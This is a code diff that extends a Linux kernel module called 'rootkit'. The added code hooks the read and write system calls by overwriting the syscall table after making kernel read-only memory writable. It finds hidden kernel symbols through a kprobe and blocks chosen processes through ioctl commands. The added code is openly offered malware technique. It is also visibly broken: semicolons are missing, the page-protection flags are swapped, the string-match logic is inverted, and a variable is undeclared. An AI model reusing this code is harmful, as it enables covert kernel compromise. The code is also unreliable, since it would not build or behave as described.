@@ -78,6 +78,140 @@ static void masquerade_proc(struct masq_proc *proc) {
     }
 }
 
+static struct kprobe kp = {
+    .symbol_name = "kallsyms_lookup_name"
+};
+
+unsigned long (*kallsyms_lookup_name)(const char *);
+
+static void get_kallsyms_lookup_name (void) {
+    struct kprobe kp;
+    register_kprobe(&kp);
+    kallsyms_lookup_name = kp.addr
+    unregister_kprobe(&kp);
+}
+
+static unsigned long *__sys_call_table;
+void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
+unsigned long start_rodata;
+unsigned long init_begin;
+
+
+static void resolve_symbol_addr (void) {
+    __sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+    update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
+    start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
+    init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
+}
+
+#define section_size init_begin - start_rodata
+
+// change the memory region to be read-only
+static inline void memory_ro (void) {
+    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, \
+                        section_size, PAGE_KERNEL); 
+}
+
+// change the memory region to be read-write
+static inline void memory_rw (void) {
+    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, \
+                        section_size, PAGE_KERNEL_RO);
+}
+
+static t_syscall real_read;
+static t_syscall real_write;
+static asmlinkage int fake_read (pt_regs *regs);
+static asmlinkage int fake_write (pt_regs *regs);
+
+static int set_syscall_filter (void) {
+    memory_rw();
+    
+    real_read = (t_syscall)__sys_call_table[__NR_read];
+    real_write = (t_syscall)__sys_call_table[__NR_write];
+    __sys_call_table[__NR_read] = (unsigned long) &fake_read;
+    __sys_call_table[__NR_write] = (unsigned long) &fake_write;
+
+    memory_ro();
+    return 0;
+}
+
+static int remove_syscall_filter (void) {
+    memory_rw();
+    
+    __sys_call_table[__NR_read] = real_read;
+    __sys_call_table[__NR_write] = real_write;
+
+    memory_ro();
+    return 0;
+}
+
+struct filter {
+    int syscall_nr;             // Syscall number
+    char comm[TASK_FILTER_LEN]; // Process name
+    struct list_head list;      // circular list
+}
+
+static filter *head;
+
+static asmlinkage int fake_read (pt_regs *regs) {
+    filter *cur;
+    struct task_struct *current_t = current;
+    list_for_each_entry(cur, &head->list, list) {
+        if (strcmp(cur->comm, current_t->comm))
+            return -EPERM;
+    }
+    return real_read(regs);
+}
+
+static asmlinkage int fake_write (pt_regs *regs) {
+    filter *cur;
+    struct task_struct *current_t = current;
+    list_for_each_entry(cur, &head->list, list) {
+        if (strcmp(cur->comm, current_t->comm))
+            return -EPERM;
+    }
+    return real_write(regs);
+}
+
+static int add_new_filter_element (struct filter_info *info) {
+    // We Do check whether two or more identical elements are added to the filter 
+    int ret = 0;
+
+    struct filter *cur;
+    list_for_each_entry(cur, &head->list, list) {
+        if (info->syscall_nr == cur->syscall_nr && strcmp(cur->comm, info->comm) == 0) {
+            ret = -EPERM; // error for identical element
+            return ret;
+        }
+    }
+    
+    struct filter *element;
+    element = kmalloc(sizeof(struct filter), GFP_KERNEL);
+    if (!element) {
+        ret = -ENOMEM;
+        return ret;
+    }
+
+    strcpy(element->comm, info->comm);
+    element->syscall_nr = info->syscall_nr;
+    list_add_tail(&element->list, &head);
+    return ret;
+}
+
+static int remove_filter_element (struct filter_info *info) {
+    ret = -EFAULT; // info NOT in the list
+    struct filter *cur;
+    list_for_each_entry(cur, &head->list, list) {
+        if (info->syscall_nr == cur->syscall_nr && strcmp(cur->comm, info->comm) == 0) {
+            list_del(&cur->list);
+            kfree(cur);
+            ret = 0;
+            break;
+        }
+    }
+    return ret;
+}
+
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                           unsigned long arg) {
     long ret = 0;
@@ -120,15 +254,24 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
         kfree(procs);
         break;
     case IOCTL_ADD_FILTER:
-        // do something
+        struct filter_info info;
+        if (copy_from_user(&info, (void *)arg, sizeof(info))) {
+            ret = -EFAULT;
+            break;
+        }
+        ret = add_new_filter_element(&info);
         break;
     case IOCTL_REMOVE_FILTER:
-        // do something
+        struct filter_info info;
+        if (copy_from_user(&info, (void *)arg, sizeof(info))) {
+            ret = -EFAULT;
+            break;
+        }
+        ret = remove_filter_element(&info)
         break;
     default:
         ret = -EINVAL;
     }
-
     return ret;
 }
 
@@ -143,6 +286,17 @@ struct file_operations fops = {
 };
 
 static int __init rootkit_init(void) {
+    // get function kallsyms_lookup_name
+    get_kallsyms_lookup_name();
+    // get addresses of symbols
+    resolve_symbol_addr();
+    // set filter
+    set_syscall_filter();
+    // init filter_list *head
+    head = kmalloc(sizeof(struct filter), GFP_KERNEL);
+    head->list.prev = &head->list;
+    head->list.next = &head->list;
+
     major = register_chrdev(0, OURMODNAME, &fops);
     if (major < 0) {
         pr_err("Registering char device failed with %d\n", major);
@@ -159,6 +313,7 @@ static int __init rootkit_init(void) {
 
 static void __exit rootkit_exit(void) {
     // TODO: unhook syscall and cleanup syscall filter list
+    remove_syscall_filter();
 
     pr_info("%s: removed\n", OURMODNAME);
     device_destroy(cls, MKDEV(major, 0));
